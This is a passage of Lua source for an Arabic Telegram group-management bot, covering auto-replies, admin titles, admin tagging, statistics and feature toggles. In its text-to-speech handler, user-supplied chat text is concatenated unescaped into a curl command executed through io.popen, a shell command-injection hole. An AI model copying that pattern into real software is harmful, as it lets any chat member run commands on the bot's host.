send(msg.chat_id_, msg.id_,' ◉ ارسل الرد الذي تريد اضافته')
database:set(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_,'true1')
database:set(bot_id..'Text:Manager'..msg.sender_user_id_..':'..msg.chat_id_, text)
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:sadd(bot_id..'List:Manager'..msg.chat_id_..'', text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_..'') == 'true2' then
send(msg.chat_id_, msg.id_,' ◉ تم ازالة الرد ')
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:del(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_)
database:srem(bot_id..'List:Manager'..msg.chat_id_..'', text)
return false
end
end
if text == 'اضف رد' and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_, msg.id_,' ◉ ارسل الكلمه التي تريد اضافتها')
database:set(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_,true)
return false 
end
if text == 'مسح رد' and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_, msg.id_,' ◉ ارسل الكلمه التي تريد مسحها')
database:set(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_,'true2')
return false 
end
if text and not database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
local anemi = database:get(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
local veico = database:get(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
local stekr = database:get(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
local text1 = database:get(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
local photo = database:get(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
local video = database:get(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
local document = database:get(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
local audio = database:get(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
------------------------------------------------------------------------
if text and text:match("^قول (.*)$") and not database:get(bot_id.."Speak:after:me"..msg.chat_id_) then
local Textxt = text:match("^قول (.*)$")
send(msg.chat_id_, msg.id_, '['..Textxt..']')
end

if text and text:match("^انطق (.*)$") then   
local textntk = text:match("^انطق (.*)$")   
UrlAntk = https.request('https://apiabs.ml/Antk.php?abs='..URL.escape(textntk)..'')   
Antk = JSON.decode(UrlAntk)   
if UrlAntk.ok ~= false then   
download_to_file("https://translate"..Antk.result.google..Antk.result.code.."UTF-8"..Antk.result.utf..Antk.result.translate.."&tl=ar-IN",Antk.result.translate..'.mp3')    
local curlm = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. msg.chat_id_ ..'" -F "document=@'..''..textntk..'.mp3'..'"' io.popen(curlm) 
end   
end
if text == "غنيلي" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(3,200); 
local Text ='تم اختيار المقطع الصوتي لك' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐀𝐥𝐟𝐚', url="t.me/so_alfaa "}},
{{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/Ccckkc/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
end

if text == "ثيم" then  
ght = math.random(1,33);  
local Text ='الستخدم ثيم اخر اكتب ثيم'  
keyboard = {}   
keyboard.inline_keyboard = {  
 {{text = '𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐀𝐥𝐟𝐚', url="t.me/so_alfaa "}},
}  
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendDocument?chat_id=' .. msg.chat_id_ .. '&document=https://t.me/ahmedthem1/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == "استوري" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(2,22); 
local Text ='تم اختيار فديو استوري  لك' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ◉', url="t.me/so_alfaa "}},
{{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/koko12300/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text and text:match("^وضع لقب (.*)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local timsh = text:match("^وضع لقب (.*)$")
function start_function(extra, result, success)
local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
local getInfo = JSON.decode(chek)
if getInfo.result.can_promote_members == false then
send(msg.chat_id_, msg.id_,'◉لا يمكنني تعديل  او وضع لقب ليس لدي صلاحيه\n ◉قم بترقيتي جميع الصلاحيات او صلاحية اضافه مشرف ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..') '
status  ='\n◉ الايدي ← '..result.sender_user_id_..'\n◉تم ضافه {'..timsh..'} كلقب له'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
https.request("https://api.telegram.org/bot"..token.."/setChatAdministratorCustomTitle?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&custom_title="..timsh)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text == ("مسح لقب") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس مشرف يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉  العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉  الايدي ← `'..result.sender_user_id_..'`\n ◉  تم مسح لقبه من الجروب'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^مسح لقب @(.*)$") and Constructor(msg) then
local username = text:match("^مسح لقب @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس مشرف يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ◉  عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
usertext = '\n ◉  العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉  تم مسح لقبه من الجروب'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '◉ لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text == 'لقبي' and tonumber(msg.reply_to_message_id_) == 0 then
Ge = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..msg.sender_user_id_)
GeId = JSON.decode(Ge)
if not GeId.result.custom_title then
send(msg.chat_id_, msg.id_,'◉ لا يوجد لقب لك ') 
else
send(msg.chat_id_, msg.id_,'◉ لقبك هو  : '..GeId.result.custom_title) 
end
end
if text == "فحص البوت" and Manager(msg) then
local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
local getInfo = JSON.decode(chek)
if getInfo.ok == true then
if getInfo.result.can_change_info == true then
INf = '❴ ✔️ ❵' 
else 
INf = '❴ x ❵' 
end
if getInfo.result.can_delete_messages == true then
DEL = '❴ ✔️ ❵' 
else 
DEL = '❴ x ❵' 
end
if getInfo.result.can_invite_users == true then
INv = '❴ ✔️ ❵' 
else
INv = '❴ x ❵' 
end
if getInfo.result.can_pin_messages == true then
Pin = '❴ ✔️ ❵' 
else
Pin = '❴ x ❵' 
end
if getInfo.result.can_restrict_members == true then
REs = '❴ ✔️ ❵' 
else 
REs = '❴ x ❵' 
end
if getInfo.result.can_promote_members == true then
PRo = '❴ ✔️ ❵'
else
PRo = '❴ x ❵'
end 
send(msg.chat_id_, msg.id_,'\n ◉صلاحيات البوت هي\n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n◉  علامة ال {✔️} تعني مفعل\n◉  علامة ال {x} تعني غير مفعل\n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n◉تغير معلومات المجموعة ↞ '..INf..'\n◉مسح الرسائل ↞ '..DEL..'\n◉حظر المستخدمين ↞ '..REs..'\n◉دعوة المستخدمين ↞ '..INv..'\n◉ثتبيت الرسالة ↞ '..Pin..'\n◉اضافة مشرفين ↞ '..PRo)   
end
end

if text and text == "تفعيل تاك المشرفين" and Manager(msg) then 
database:set(bot_id.."so_alfaa :Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"◉تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."so_alfaa :Tag:Admins:"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "◉تم تعطيل تاك المشرفين")
end

if text == 'صيح المشرفين' or text == "تاك للمشرفين" or text == "وين المشرفين" or text == "المشرفين" then
if database:get(bot_id.."so_alfaa :Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,b)  
if b.username_ then 
User_id = "@"..b.username_
else
User_id = msg.sender_user_id_
end --الكود حصري سورس الفا يعني لو بكتهن راح اعرفك انت الاخذتهن
local t = "\n◉المستخدم ~ ["..User_id .."] يصيح المشرفين \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
k = 0
for i,v in pairs(data.members_) do
if bot_id ~= v.user_id_ then 
k = k + 1
local username = database:get(bot_id.."user:Name"..v.user_id_)
if database:get(bot_id..'user:Name'..v.user_id_) then
t = t..""..k.." → {[@"..database:get(bot_id..'user:Name'..v.user_id_).."]}\n"
else
t = t..""..k.." → {`"..v.user_id_.."`}\n"
end
end
end
send(msg.chat_id_, msg.id_,t)
end,nil)
end,nil)
end
end
-- عود اخمط وهوبز ع العالم كول تطويري ..

if text == "الساعه" then
local ramsesj20 = "\n الساعه الان : "..os.date("%I:%M%p")
send(msg.chat_id_, msg.id_,ramsesj20)
end

if text == "التاريخ" then
local ramsesj20 =  "\n التاريخ : "..os.date("%Y/%m/%d")
send(msg.chat_id_, msg.id_,ramsesj20)
end
--------------
--- هههه ها فرخ دتبوك ؟ ههههههههههه 
if text == ("الردود المتعدده") and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local list = database:smembers(bot_id.."botss:DRAGON:List:Rd:Sudo")
text = "\nقائمة ردود المتعدده \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
db = "رساله "
text = text..""..k.." => {"..v.."} => {"..db.."}\n"
end
if #list == 0 then
text = "لا توجد ردود متعدده"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
if text == "اضف رد متعدد" and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id.."botss:DRAGON:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"◉ارسل الرد الذي اريد اضافته")
end
if text == "مسح رد متعدد" and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id.."botss:DRAGON:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"◉ارسل الان الكلمه لمسحها ")
end
if text then  
local test = database:get(bot_id.."botss:DRAGON:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:DRAGON:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:DRAGON:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:DRAGON:Add:Rd:Sudo:Text"..test, text)  
end  
send(msg.chat_id_, msg.id_,"◉تم حفظ الرد الاول ارسل الرد الثاني")
return false  
end  
end
if text then  
local test = database:get(bot_id.."botss:DRAGON:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:DRAGON:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:DRAGON:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:DRAGON:Add:Rd:Sudo:Text1"..test, text)  
end  
send(msg.chat_id_, msg.id_,"◉تم حفظ الرد الثاني ارسل الرد الثالث")
return false  
end  
end
if text then  
local test = database:get(bot_id.."botss:DRAGON:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:DRAGON:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:DRAGON:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:DRAGON:Add:Rd:Sudo:Text2"..test, text)  
end  
send(msg.chat_id_, msg.id_,"◉تم حفظ الرد")
return false  
end  
end
if text then
local Text = database:get(bot_id.."botss:DRAGON:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:DRAGON:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:DRAGON:Add:Rd:Sudo:Text2"..text)   
if Text or Text1 or Text2 then 
local texting = {
Text,
Text1,
Text2
}
Textes = math.random(#texting)
send(msg.chat_id_, msg.id_,texting[Textes])
end
end
------------------------------------------------------------------------
if text1 then 
send(msg.chat_id_, msg.id_, text1)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if stekr then 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, stekr)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, veico)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_, 0, 1, nil,video)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if anemi then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, anemi)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, document)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,photo,photo_caption)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
end
end

-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'الفا').." غادر" or text == 'غادر' then  
if Sudo(msg) and not database:get(bot_id..'Left:Bot'..msg.chat_id_)  then 
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
send(msg.chat_id_, msg.id_,'◉ تم مغادرة المجموعه') 
database:srem(bot_id..'Chek:Groups',msg.chat_id_)  
end
return false  
end

if text == 'الاحصائيات' then
if Sudo(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = ' الاحصائيات ◉ \n'..' ◉ عدد الجروبات ← {'..Groups..'}'..'\n ◉  عدد المشتركين ← {'..Users..'}'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
if text == 'الجروبات' then
if Sudo(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = ' ◉ عدد الجروبات ← {`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
if text == 'المشتركين' then
if Sudo(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = ' ◉ عدد المشتركين ← {`'..Users..'|}'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
if text == 'تفعيل المغادره' and DevSoFi(msg) then   
if database:get(bot_id..'Left:Bot'..msg.chat_id_) then
Text = ' ◉ تم تفعيل مغادرة البوت'
database:del(bot_id..'Left:Bot'..msg.chat_id_)  
else
Text = ' ◉ بالتاكيد تم تفعيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل المغادره' and DevSoFi(msg) then  
if not database:get(bot_id..'Left:Bot'..msg.chat_id_) then
Text = ' ◉ تم تعطيل مغادرة البوت'
database:set(bot_id..'Left:Bot'..msg.chat_id_,true)   
else
Text = ' ◉ بالتاكيد تم تعطيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_, Text) 
end

if text == 'تفعيل الردود' and Manager(msg) then   
if database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
Text = ' ◉ تم تفعيل الردود'
database:del(bot_id..'Reply:Manager'..msg.chat_id_)  
else
Text = ' ◉ تم تفعيل الردود'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الردود' and Manager(msg) then  
if not database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
database:set(bot_id..'Reply:Manager'..msg.chat_id_,true)  
Text = '\n ◉ تم تعطيل الردود' 
else
Text = '\n ◉ بالتاكيد تم تعطيل الردود'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الردود العامه' and Manager(msg) then   
if database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
database:del(bot_id..'Reply:Sudo'..msg.chat_id_)  
Text = '\n ◉ تم تفعيل الردود العامه' 
else
Text = '\n ◉ بالتاكيد تم تفعيل الردود العامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الردود العامه' and Manager(msg) then  
if not database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
database:set(bot_id..'Reply:Sudo'..msg.chat_id_,true)   
Text = '\n ◉ تم تعطيل الردود العامه' 
else
Text = '\n ◉ بالتاكيد تم تعطيل الردود العامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الايدي' and Manager(msg) then   
if database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
database:del(bot_id..'Bot:Id'..msg.chat_id_) 
Text = '\n ◉ تم تفعيل الايدي' 
else
Text = '\n ◉  بالتاكيد تم تفعيل الايدي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الايدي' and Manager(msg) then  
if not database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
database:set(bot_id..'Bot:Id'..msg.chat_id_,true) 
Text = '\n ◉ تم تعطيل الايدي' 
else
Text = '\n ◉ بالتاكيد تم تعطيل الايدي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الايدي بالصوره' and Manager(msg) then   
if database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_)  then
database:del(bot_id..'Bot:Id:Photo'..msg.chat_id_) 
Text = '\n ◉ تم تفعيل الايدي بالصور' 
else
Text = '\n ◉ بالتاكيد تم تفعيل الايدي بالصوره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الايدي بالصوره' and Manager(msg) then  
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_)  then
database:set(bot_id..'Bot:Id:Photo'..msg.chat_id_,true) 
Text = '\n ◉ تم تعطيل الايدي بالصوره' 
else
Text = '\n ◉ بالتاكيد تم تعطيل الايدي بالصوره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الحظر' and Constructor(msg) then   
if database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
database:del(bot_id..'Lock:kick'..msg.chat_id_) 
Text = '\n ◉ تم تفعيل الحظر' 
else
Text = '\n ◉ بالتاكيد تم تفعيل الحظر'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الحظر' and Constructor(msg) then  
if not database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
database:set(bot_id..'Lock:kick'..msg.chat_id_,true) 
Text = '\n ◉ تم تعطيل الحظر' 
else
Text = '\n ◉ بالتاكيد تم تعطيل الحظر'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الرفع' and Constructor(msg) then   
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
database:del(bot_id..'Lock:Add:Bot'..msg.chat_id_) 
Text = '\n ◉ تم تفعيل الرفع' 
else
Text = '\n ◉ بالتاكيد تم تفعيل الرفع'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الرفع' and Constructor(msg) then  
if not database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
database:set(bot_id..'Lock:Add:Bot'..msg.chat_id_,true) 
Text = '\n ◉ تم تعطيل الرفع' 
else
Text = '\n ◉ بالتاكيد تم تعطيل الرفع'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ايدي' and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_) or 1) 
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..result.sender_user_id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..result.sender_user_id_) or 0)
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..result.sender_user_id_) or 0)
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,' ◉ ايديه ⇜ '..iduser..'\n ◉ معرفه ⇜ ↝'..username..'↜\n ◉ رتبته ⇜ '..rtp..'\n ◉ تعديلاته ⇜ '..edit..'\n ◉ نقاطه ⇜ '..NUMPGAME..'\n ◉ جهاته ⇜ '..Contact..'\n ◉ رسائله ⇜ ↝'..Msguser..'↜')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match("^ايدي @(.*)$") then
local username = text:match("^ايدي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n ◉  يرجى الاشتراك بالقناه اولا \n ◉  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..result.id_) or 1) 
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..result.id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..result.id_) or 0)
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..result.id_) or 0)
local rtp = Rutba(result.id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.id_
send(msg.chat_id_, msg.id_,' ◉ ايديه ⇜↝'..iduser..'↜\n ◉ معرفه ⇜↝'..username..'↜\n ◉ رتبته ⇜↝'..rtp..'↜\n ◉ تعديلاته ⇜('..edit..')\n ◉ نقاطه ⇜('..NUMPGAME..')\n ◉ جهاته ⇜('..Contact..')\n ◉ رسائله ⇜(↝'..Msguser..'↜)')
end,nil)
else
send(msg.chat_id_, msg.id_,' ◉ المعرف غير صحيح ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text == 'رتبتي' then
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
send(msg.chat_id_, msg.id_,' ◉ رتـبتـك ← '..rtp)
end

if text == 'انا مين' and SudoBot(msg) then 
send(msg.chat_id_,msg.id_,'◉ انت مطوري حبيبي..🥺♥️')
return false
end


if text == 'انا مين' and DevSoFi(msg) then 
send(msg.chat_id_,msg.id_,'◉ انت مطوري الثاني يحياتي..🙂♥️')
return false
end

if text == 'انا مين' and Sudo(msg) then 
